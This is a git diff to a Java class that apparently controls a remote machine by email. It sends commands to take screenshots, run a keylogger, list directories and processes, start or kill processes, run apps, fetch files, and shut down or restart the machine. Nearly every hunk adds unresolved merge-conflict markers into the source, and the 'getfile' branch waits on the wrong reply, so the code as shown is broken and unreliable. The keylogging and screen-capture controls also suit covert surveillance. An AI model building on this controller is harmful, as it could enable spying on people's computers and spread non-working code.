@@ -144,6 +144,10 @@ public class Start {
                 try {
                     SendMail.getInstance().Send("takeshot");
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("takeshot");
                     File file = new File(a);
                     if (file.exists()) {
@@ -183,7 +187,7 @@ public class Start {
                             try {
                                 SendMail.getInstance().Send("keylog/" + time);
                                 display("Mail had been sent!! Waiting for a response...", "green");
-                                Thread.sleep(15000 + time);
+                                Thread.sleep(time);
                                 String a = CheckMail.getInstance().listen("keylog");
                                 File file = new File(a);
                                 if (file.exists()) {
@@ -216,6 +220,10 @@ public class Start {
                 try {
                     SendMail.getInstance().Send("listdir");
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("listdir");
                     File file = new File(a);
                     if (file.exists()) {
@@ -241,6 +249,10 @@ public class Start {
                 try {
                     SendMail.getInstance().Send("listprocess");
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("listprocess");
                     File file = new File(a);
                     if (file.exists()) {
@@ -275,7 +287,11 @@ public class Start {
                             System.out.println(pid);
                             SendMail.getInstance().Send("stopprocess/" + pid);
                             display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
 
+=======
+                            //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                             String a = CheckMail.getInstance().listen("stopprocess");
                             if (a != null) {
                                 if(a.contains("res")){
@@ -307,7 +323,11 @@ public class Start {
                     String pid = optionals.getText();
                     SendMail.getInstance().Send("startprocess/" + pid);
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("startprocess");
                     if (a != null) {
                         if(a.contains("res")){
@@ -335,7 +355,11 @@ public class Start {
                 try {
                     SendMail.getInstance().Send("listapp");
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("listapp");
                     File file = new File(a);
                     if (file.exists()) {
@@ -362,7 +386,11 @@ public class Start {
                     String sudo = optionals.getText();
                     SendMail.getInstance().Send("shutdown/" + sudo);
                     display("Mail had been sent!! Pleas wait 30 seconds, if there is response, it means some errors have occurred", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(10000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("shutdown");
                     if(a.contains("res")) {
                         String[] parts = a.split("/");
@@ -386,7 +414,11 @@ public class Start {
                 try {
                     SendMail.getInstance().Send("restart");
                     display("Mail had been sent!! Pleas wait 30 seconds, if there is response, it means some errors have occurred", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(10000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("restart");
                     if(a.contains("res")) {
                         String[] parts = a.split("/");
@@ -412,7 +444,11 @@ public class Start {
                     System.out.println(file);
                     SendMail.getInstance().Send("runapp/" + file);
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("runapp");
                     if(a.contains("res")) {
                         String[] parts = a.split("/");
@@ -454,7 +490,11 @@ public class Start {
                     System.out.println(file);
                     SendMail.getInstance().Send("getfile/" + file);
                     display("Mail had been sent!! Waiting for a response...", "green");
+<<<<<<< HEAD
 
+=======
+                    //Thread.sleep(15000);
+>>>>>>> 5ee59ea5bf96c438a8a4cd0d92ec84fdcee36bfb
                     String a = CheckMail.getInstance().listen("runapp");
                     if (a != null) {
                         if(a.contains("res")){
